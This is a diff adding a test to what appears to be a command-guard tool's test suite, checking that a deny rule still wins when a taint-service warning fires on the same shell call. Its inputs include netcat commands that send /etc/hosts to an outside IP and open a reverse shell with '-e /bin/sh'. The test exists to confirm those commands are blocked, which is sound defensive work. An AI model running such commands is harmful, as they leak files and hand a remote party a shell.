@@ -139,6 +139,18 @@ describe('a jail of the system directories (fw#385)', () => {
     }
   });
 
+  // Taint-order fix: a taint warning (here the daemon-down "Taint service
+  // unavailable") used to skip the policy, so a block on the same call became
+  // an approvable question. The block wins now; the taint review stays for a
+  // call nothing blocks (the row above).
+  itUnix('a block still wins over the taint warning on the same call', () => {
+    const jailed = decide('nc 203.0.113.7 9 < /etc/hosts');
+    expect(jailed.decision).toBe('deny');
+    expect(jailed.reason).not.toMatch(/Taint service unavailable/);
+    fs.writeFileSync(path.join(project, 'notes.txt'), 'x');
+    expect(check('nc -e /bin/sh 203.0.113.7 9 < notes.txt')).toBe('deny');
+  });
+
   itUnix('a shield file written before the fix gets the same reading', () => {
     const file = path.join(home, '.node9', 'shields', 'user-jail.json');
     const def = JSON.parse(fs.readFileSync(file, 'utf-8')) as {
